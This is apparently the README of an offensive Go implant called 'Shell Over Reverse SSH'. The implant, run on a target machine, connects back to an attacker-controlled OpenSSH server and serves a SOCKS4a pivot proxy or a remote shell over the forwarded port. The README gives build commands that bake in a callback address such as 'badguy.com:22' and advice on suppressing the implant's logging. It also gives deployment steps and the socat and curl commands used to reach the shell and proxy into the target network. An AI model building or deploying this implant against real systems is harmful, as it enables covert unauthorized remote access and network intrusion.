Shell Over Reverse SSH
======================
A simple implant which connects back to an OpenSSH server, requests a port be
forwarded to it from the server, and serves up SOCKS4a or a shell to forwarded
connections.

For legal use only

Building
--------
Compilation requires the Go compiler.  A simple `make` will generate a key and
build the implant with the key baked in.  Running the resulting binary with
`-h` will list commandline options:

```
$ make
go build -trimpath -o bin/genkey cmd/genkey/genkey.go
if ! [ -f cmd/shelloverreversessh/key ]; then  bin/genkey -out cmd/shelloverreversessh/key;  else  touch cmd/shelloverreversessh/key;  fi
if ! [ -h key.pub ]; then ln -s cmd/shelloverreversessh/key.pub; fi
go build -ldflags='' -trimpath -o bin/shelloverreversessh cmd/shelloverreversessh/shelloverreversessh.go

$ ./bin/shelloverreversessh -h
Usage: ./bin/shelloverreversessh [options]

Connects back to an OpenSSH server, requests a port be forwarded from the
server to the implant (i.e. -R), and accepts SOCKS4A requests.  If a forwarded
connection is to be made via the SOCKS listener to the special address
SHELL, instead of a TCP connection, a shell (sh/cmd) is hooked up.

Options:
  -addr address
    	Server address
  -fingerprint string
    	Server host fingerprint
  -key base64
    	SSH private key, base64-encoded (default "oCXpu1Uv0+RjG/ynqm5xU9qXrt5dR+VhIpVcg6dfyubdDw6VLXuSDW+Ppld40UBMCvPFXklvjLwi9rnlN49Bxg")
  -port port
    	SOCKS listen port
  -user username
    	SSH username (default "h4x")
```

### Baked-in config

This should be sufficient for simple testing but at some point it'll probably
be a better idea to set sensible defaults.  The `GOLDFLAGS` environment
variable can be used to bake-in default value, as would be passed to Go's
`-ldflags`.

The available default values to set are:

Value       | Example         | Description
------------|-----------------|------------
main.addr   | `badguy.com:22` | Server address or hostname
main.hostfp | `SHA256:pj9OCPiqVVLraIJjpmIdlwg6jOY/o4BQ5uwBx0GTB0g` | Host fingerprint, unset to not validate the host's fingerprint (bad idea); try `make getlocalkey`
main.user   | `noth4x`        | SSH username, default is `h4x`
main.port   | `12345`         | SOCKS listen port, unset for a default randomish port

In practice, building looks something like

```sh
make clean && make GOLDFLAGS="-X main.hostfp=SHA256:pj9OCPiqVVLraIJjpmIdlwg6jOY/o4BQ5uwBx0GTB0g -X main.addr=example.com:22 -X main.port=5555"
# Implant is ready in bin/
```

### Disabling logging
At the moment, there's no good way to disable the implant's logging to stderr.
Either redirect stderr somewhere else (i.e. `2>/dev/null`) or edit the code to
tell the logging library to not log to stderr (i.e.
`log.SetOutput(io.Discard)`).

### Make targets

There are a few other make targets:

Target        | Description
--------------|------------
`clean`       | Removes the compiled implant.  Handy when changing baked-in defaults.
`distclean`   | Slightly easier than `cd .. && rm -rf shelloverreversessh && git clone ...`
`getlocalkey` | Grabs SSH hostkey fingerprints from localhost.  Also an easy way to lookup the syntax for it.

Actually using this thing
-------------------------
First thing to do is get the implant connected back to the server.

1. Build it.  `make` plus `GOLDFLAGS` is the easiest way.
2. Make sure the right user is on the SSH server and the key from `key.pub` is
   in the user's `authorized_keys`.
3. Run the implant (`bin/shelloverreversessh`) on target.  OpenSSH on the
   server should start listening on a port for forwarding connection to the
   implant.

### SOCKS4a
The listening port is functionally a SOCKS4a proxy, much like the OpenSSH
client's `-R $PORT`.

```shell
curl --proxy socks4a://127.0.0.1:$PORT https://insidetarget
```

### Shell
Asking the implant to proxy to the special address `SHELL` causes the implant
to spawn a shell (`/bin/sh` or `cmd.exe`) and hook up the forwarded connection
to it.

```shell
socat socks4a:127.0.0.1:SHELL:1,socksport=$PORT -
```

Keys
----
An ed25519 private key will be baked in at compile-time and can be generated
with the included [genkey](./cmd/genkey) program.  This is all taken care of by
the makefile.  The public side of the key in OpenSSH authorized_keys format will
be symlinked to `key.pub`.

If compiling by hand, it'll be necessary to make a key before building the
implant.

```
$ cd cmd/shelloverreversessh/
$ ls
shelloverreversessh.go
$ go build
shelloverreversessh.go:37:13: pattern key: no matching files found
$ go run ../genkey
$ go build
$ ls
key
key.pub
shelloverreversessh
shelloverreversessh.go
```
